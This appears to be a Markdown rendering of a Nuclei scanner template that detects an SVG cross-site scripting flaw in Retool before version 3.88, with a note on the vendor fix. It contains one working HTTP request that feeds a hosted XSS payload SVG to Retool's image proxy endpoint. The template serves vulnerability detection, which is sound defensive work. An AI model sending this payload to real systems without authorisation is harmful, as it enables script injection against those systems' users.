# Nuclei Template: Retool < 3.88 - SVG Cross-Site Scripting
**Template ID:** retool-svg-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`retool-svg-xss.yaml`)

## Vulnerability Information & PoC

## Description
This template checks for SVG Cross-Site Scripting(XSS) vulnerability via the Image Proxy URL parameter in Retool.

## Steps to reproduce / Exploit Payload
```http
GET /api/imageProxy?url=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg HTTP/1.1
Host: {{Hostname}}
```

## References
- https://docs.retool.com/releases/edge/3.88#:~:text=Fixed%20an%20SVG%20XSS%20vulnerability%20by%20adding%20a%20CSP.%20(%2349381)
